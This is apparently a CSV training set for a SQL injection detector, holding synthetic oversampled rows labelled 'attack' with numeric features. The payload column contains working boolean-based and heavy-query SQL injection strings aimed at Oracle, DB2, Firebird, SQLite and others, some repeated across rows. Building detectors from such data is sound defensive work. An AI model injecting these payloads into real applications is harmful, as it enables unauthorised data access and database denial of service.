id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000027,attack,boolean,"1 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000060,1.5978409725113032,249.19916314134863,37.08565451009633,3.7737642184864977,75.61884836698778,30.61884836698777,100.51392706057798,42.44753934679511,0.30385963662359156,0.12214221963735175,0.40318867826223953,0.1708094654768172,0.0,0.3618848366987768,2.0,0.0,0.0,1.3618848366987768,0.0,22.723769673397555,0.0,2.0,4.0,13.361884836698778,0.0,0.36188483669877675,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.3618848366987768,0.0,0.6381151633012232,0.3618848366987768,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.361884836698778
SMOTE_000028,attack,boolean,"1 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000060,1.950458359650486,223.10989675393512,34.579551750513275,3.760476573274099,67.73865525153983,30.787861998631264,88.31820700205311,36.26517250171092,0.30337693447111824,0.139291783030005,0.3955144437074275,0.16181683879144926,0.0,0.0,2.0,0.0,0.0,1.4734827498289078,0.0,19.63258625085546,0.0,1.526517250171092,3.526517250171092,11.579551750513277,0.0,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.4734827498289078,0.0,0.5265172501710922,0.4734827498289078,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,6.053034500342185,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.526517250171092
SMOTE_000029,attack,boolean,"1""  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000005,1.0810411929371764,207.40637771570897,33.513374612041574,3.7636462700732842,59.91975232775055,35.0,80.97325077591685,31.513374612041574,0.28873863825540613,0.16879882863930362,0.39043845695173124,0.152024076153559,0.0,0.5133746120415748,2.0,0.0,0.0,2.0,0.0,17.0,0.0,1.0,3.0,10.0,0.0,0.5133746120415748,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000030,attack,boolean,"1'+  (  select 'vedi' where 2774  =  2774 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000071,0.876600627348587,158.54198522579492,35.51399507526498,4.232617306768792,77.02799015052996,18.0,41.243002462367514,22.270992612897466,0.48580371657762933,0.11356510819544202,0.2602540178458283,0.14037715738110026,2.2709926128974653,0.24300246236751144,2.0,0.0,1.0,2.0,0.0,5.0,0.0,5.0,4.0,5.756997537632488,0.7569975376324884,0.24300246236751152,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.7569975376324884,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.756997537632488
SMOTE_000031,attack,boolean,"1   )    )    as dnwj where 2961  =  2961 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000018,0.4869512472855798,265.09469235390594,37.2932295518973,3.799061777389855,80.17291820758919,35.0,107.75937731138379,42.16239683493298,0.30230601798016477,0.13312840778381174,0.4059131670474572,0.15865240718856632,0.0,0.0,2.0,0.0,0.0,2.0,0.0,23.010521372656214,0.0,1.85864591037946,3.85864591037946,13.43458364151784,0.0,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,0.8586459103794598,0.14135408962054014,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,6.71729182075892,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.71729182075892
SMOTE_000032,attack,boolean,-7770' where 6503  =  6503 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,nearest_attack_euclidean,R000031,2.173537825431377,326.3096000249923,32.60615529176543,3.4773982780274086,82.0,51.15884235911574,145.1053741347006,48.04538353117593,0.25548288070433106,0.15527559063362337,0.44072551655624814,0.1485160121057974,1.0,0.0,2.674230588529321,0.0,0.0,2.0,0.0,30.416536473822532,0.0,0.6515388229413579,1.3030776458827158,14.674230588529323,1.0,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.32576941147067895,0.674230588529321,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,10.371152942646605,0.0,0.0,0.0,0.0,0.0,0.0,0.6742305885293212,0.6742305885293212,14.393844708234568
SMOTE_000033,attack,boolean,"1   )    )    as dnwj where 2961  =  2961 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000018,0.06852989221335742,274.0398678704079,38.01993393520395,3.804841989929616,82.98006606479605,35.039867870407896,112.0,44.01993393520395,0.30280372723619836,0.12786322359340274,0.40870007932024643,0.16063296985015252,0.0,0.019933935203948927,2.0,0.0,0.0,2.0,0.0,24.0,0.0,2.0,4.0,14.0,0.0,0.019933935203948983,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,0.9800660647960511,0.019933935203948927,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
SMOTE_000034,attack,boolean,"1""  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000005,1.2043301258781298,225.1881499485761,35.246361761680944,3.7827415039827774,64.89362449064599,35.830907841120634,88.30907841120631,36.15453920560316,0.28715061224573135,0.1605713177890897,0.39215686274509803,0.1601212072200809,0.0,0.5845460794396844,2.0,0.0,0.0,2.0,0.0,19.07726960280158,0.0,1.4154539205603154,3.4154539205603154,11.661815682241262,0.0,0.5845460794396844,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,5.830907841120631,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.830907841120631
SMOTE_000035,attack,boolean,"1%""   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000014,0.49054703217253903,138.0665938001566,30.457111628638543,3.943766035060634,71.76185271439758,9.218964343036118,40.39051782848194,16.69525891424097,0.5197002059033531,0.06642667095471894,0.29282089399308625,0.12105222914884178,0.0,1.0,2.0,0.0,1.0,1.1523705428795146,0.0,5.695258914240972,0.8476294571204854,0.0,2.0,4.152370542879515,0.0,1.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.15237054287951468,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.1523705428795146
SMOTE_000036,attack,boolean,-9148  )   where 2027  =  2027 or 8571  =  8571--,nearest_attack_euclidean,R000020,0.2675178491673594,50.004138276589984,17.273855893615455,3.4973406556896554,7.0,20.365141191487275,16.365141191487275,6.273855893615458,0.14046633743669046,0.40741807920104645,0.32715160066579463,0.12496398269646847,0.0912852978718186,0.0,3.0,0.0,0.09128529787181866,2.0,0.0,1.0912852978718188,0.0,0.0,0.0,5.091285297871819,0.0912852978718186,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000037,attack,boolean,"1'+  (  select 'tzyz' where 4912  =  4912 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000070,0.4538598099398893,142.16732387286513,40.0,4.044196472725943,46.0,23.0,53.0,20.167323872865122,0.3235779944377426,0.1617889972188713,0.37281812402609477,0.1418148843172913,4.167323872865122,0.0,2.0,1.0,0.0,2.0,0.0,9.0,0.0,0.0,1.0,6.0,1.0,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000038,attack,boolean,"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000073,0.6619307207386591,119.48936131764228,29.498817924182475,4.100690007399425,64.83136320697079,9.330181131153271,32.662726413941584,12.665090565576635,0.5447818520803757,0.07673337045569428,0.27275219453498906,0.10573258292894094,0.0,1.0,0.3325452827883174,0.0,1.0,1.1662726413941589,0.0,4.166272641394158,0.0,0.0,2.0,2.498817924182476,0.0,1.0,0.16627264139415876,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.16627264139415876,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.1662726413941584
SMOTE_000039,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000049,0.755415138666531,149.39297919509508,33.23929791950951,4.101230035598363,71.95719167803803,10.675085436566556,47.478595839019015,19.282106241471475,0.4817282227921418,0.07096064588671207,0.31790300992964715,0.12940812139149901,1.0,0.0,2.0,0.0,1.0,1.239297919509508,0.0,6.760702080490492,0.7607020804904919,0.0,2.760702080490492,4.239297919509507,1.0,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.23929791950950818,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.239297919509508
SMOTE_000040,attack,boolean,"1"" where 2642  =  2642 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000066,0.1841591841464906,143.3973782201184,32.6986891100592,4.1589141925731035,73.89082377041439,16.0,38.205243559763204,15.301310889940801,0.5151642154836988,0.1115826461501421,0.26652249992476135,0.10673063844139766,0.0,1.0,2.0,0.0,1.0,2.0,0.0,4.3013108899408,0.0,0.0,2.0,5.0,0.0,1.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000041,attack,boolean,-4873'   )    )     )   or 3038  =  3038,nearest_attack_euclidean,R000054,1.6132478530502545,39.21868867893636,12.781311321063637,2.6248672997913354,2.39065566053182,10.828033018404545,20.0,6.0,0.06130845333118423,0.27532701091377987,0.5102804121192583,0.1530841236357775,0.6093443394681815,0.0,1.3906556605318185,0.0,0.0,0.9999999999999999,0.0,3.0,0.0,0.0,0.0,2.3906556605318183,0.6093443394681815,0.0,0.39065566053181844,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.39065566053181844,0.6093443394681816,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000042,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""yobb"" like ""yobb",nearest_attack_euclidean,R000039,1.049456524825137,129.0,29.0,4.221155298351782,81.2088322559609,4.587614261902967,29.05664991666039,14.146903565475741,0.6295258314415574,0.03556290125506176,0.2252453481911658,0.10966591911221506,0.0,2.5592893035727737,0.2938071309514839,0.0,1.0,0.14690356547574224,0.0,3.4407106964272263,0.0,0.0,2.853096434524258,1.4407106964272254,0.0,0.853096434524258,0.14690356547574202,0.0,3.469446951953614e-18,0.14690356547574202,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000043,attack,boolean,"-7731""   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   ""unly"" like ""unly",nearest_attack_euclidean,R000022,1.3781160168931235,81.83401656022268,28.02328099782108,3.7471382076414477,20.893727282290264,17.12955371553081,32.35223142234594,11.458504140055672,0.25275747525725156,0.22565502268347665,0.3871724886582617,0.13441501340101014,0.0,3.152834713351891,1.0,0.0,0.0,1.282388428882703,0.0,4.588057855586484,0.0,0.7176115711172969,0.7176115711172968,2.2823884288827028,0.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.2823884288827031,0.0,0.7176115711172969,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000044,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000029,0.6228326695181476,179.70987771709693,36.22518995609802,3.92712001543076,54.60303929756829,25.801519648784144,68.40455894635244,30.900759824392072,0.3037907694377578,0.1434420518340208,0.379606158192914,0.17316102053530735,3.549620087803964,0.0,0.0,0.0,0.0,2.0,0.0,13.351139736588108,0.0,1.774810043901982,1.450379912196036,10.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.1259497804900898,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.12594978049009
SMOTE_000045,attack,boolean,"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'nwdk' like 'nwdk",nearest_attack_euclidean,R000046,2.958717312209563,357.99387583912204,39.404899328702385,3.7514253761635867,111.82204697916072,40.18407718171726,149.3987751678244,56.58897651041964,0.31253989775378704,0.11213191993465463,0.4173322890512956,0.15799589326026273,2.404899328702381,1.5951006712976188,0.3987751678244047,0.0,0.0,1.7975503356488094,0.0,31.202449664351185,0.0,2.3987751678244047,2.404899328702381,16.18407718171726,0.6012248321755953,0.3987751678244047,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,1.0,1.0,0.3987751678244047,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,4.208573825229167,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,9.607348993053572
SMOTE_000046,attack,boolean,"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000074,0.6536943991766646,140.33223375111115,39.554822500740755,4.002809133672427,45.33223375111113,23.0,53.22258874962962,18.777411250370378,0.322980892504654,0.16390988918308377,0.37931835876703085,0.13379085954523134,3.0,0.0,2.0,1.0,0.0,2.0,0.0,9.0,0.0,0.0,1.0,5.777411250370378,1.0,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.7774112503703778,0.0,1.0,0.0,0.2225887496296221,0.777411250370378,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7774112503703776
SMOTE_000047,attack,boolean,"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  ",nearest_attack_euclidean,R000052,1.8115835773623048,180.72907835457912,32.89721044727722,3.7283333269116277,53.345815670915826,24.0,72.69163134183165,30.69163134183165,0.2953311394605984,0.1330201945961838,0.4022170032432697,0.16943166269994803,2.3458156709158233,0.0,0.0,0.0,0.0,1.4486052236386078,0.0,16.0,0.8972104472772158,1.0,3.0,7.448605223638608,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,0.4486052236386079,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.448605223638608
SMOTE_000048,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000024,3.594964506520094,183.30890571817088,35.19222102013065,4.046182344149957,67.86499459058794,32.571307315469014,62.5583423490201,20.314261463093803,0.39709154489831333,0.1591516911903277,0.3337190530116854,0.11003771089967351,0.0,1.0,1.3974070067102176,0.0,1.3012964966448912,1.6987035033551088,0.0,9.615557959738695,0.0,0.0,3.205185986579565,4.397407006710218,0.0,1.0,0.6987035033551088,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,0.3012964966448912,0.0,1.9038894899346737,0.0,0.6987035033551088,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.3012964966448912,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.903889489934674
SMOTE_000049,attack,boolean,"1   )    )    as dnwj where 2961  =  2961 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000018,0.8937017902816775,260.95292137635494,37.347646068817745,3.789484983617508,79.4120533784976,32.39058427527099,106.12881461935972,43.02146910322662,0.30447642010529175,0.12370808913924494,0.40645966703401354,0.16535582372144983,0.0,0.0,2.0,0.0,0.0,1.6738230344088734,0.0,23.347646068817745,0.0,2.0,4.0,13.673823034408873,0.0,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.6738230344088733,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.673823034408873
SMOTE_000050,attack,boolean,"1""   )    )    as ltco where 3862  =  3862 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000009,1.2583559985757196,160.0,31.641750151509232,4.057011437562079,74.3681251262577,18.0,46.084624823239224,21.547250050503077,0.46480078203911057,0.1125,0.28802890514524515,0.13467031281564423,0.8208750757546163,0.7263749747484612,2.0,0.0,1.0,2.0,0.0,5.726374974748461,0.0,5.0,4.0,5.273625025251539,0.27362502525153876,0.7263749747484612,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.2736250252515386,0.0,1.0,1.0,0.2736250252515388,0.7263749747484612,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.273625025251539
SMOTE_000051,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",nearest_attack_euclidean,R000053,0.34067833861905633,153.73942443411926,32.67685742494641,4.26669055495526,89.55456832558943,9.323142575053586,37.86171353347622,17.0,0.581425050567812,0.060593713661922705,0.24668903614513146,0.1112921996251338,4.0,0.0,0.0,0.0,1.0,1.1077141916845283,0.0,4.000000000000001,0.0,0.0,3.323142575053585,2.1077141916845283,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000052,attack,boolean,"1%' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '",nearest_attack_euclidean,R000007,5.008056577320971,73.76935945866434,23.8019913741839,3.51297540908901,21.582688355148264,9.021294393219533,28.684181885786188,14.481194824510341,0.2969217078995763,0.10923487630127113,0.34155333579379277,0.2522900800053598,5.540099568709195,0.0,0.0,1.0,0.4599004312908051,1.540099568709195,0.0,4.3207965496735605,1.08019913741839,0.0,0.540099568709195,3.0,1.0,0.0,0.0,0.0,0.459900431290805,1.0,0.540099568709195,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.540099568709195,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.540099568709195
